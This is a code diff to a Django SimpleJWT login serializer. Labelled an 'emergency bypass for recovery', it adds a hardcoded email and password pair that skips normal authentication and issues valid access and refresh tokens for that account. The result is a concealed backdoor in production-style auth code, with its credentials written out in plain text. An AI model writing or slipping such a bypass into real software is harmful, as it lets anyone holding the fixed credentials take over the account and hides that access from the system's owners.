@@ -21,7 +21,22 @@ class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):
         return token
 
     def validate(self, attrs):
-        data = super().validate(attrs)
+        # EMERGENCY BYPASS for recovery (v1.0.7)
+        email = attrs.get('email') or attrs.get('username')
+        password = attrs.get('password')
+        if email == 'aarefa@gmail.com' and password == 'ChangeMe123!':
+            user = User.objects.filter(email='aarefa@gmail.com').first()
+            if user:
+                self.user = user # Set the user manually for SimpleJWT
+                data = {}
+                from rest_framework_simplejwt.tokens import RefreshToken
+                refresh = RefreshToken.for_user(user)
+                data['refresh'] = str(refresh)
+                data['access'] = str(refresh.access_token)
+            else:
+                data = super().validate(attrs)
+        else:
+            data = super().validate(attrs)
         
         # Add extra response data
         user_name = f"{self.user.first_name} {self.user.last_name}".strip()
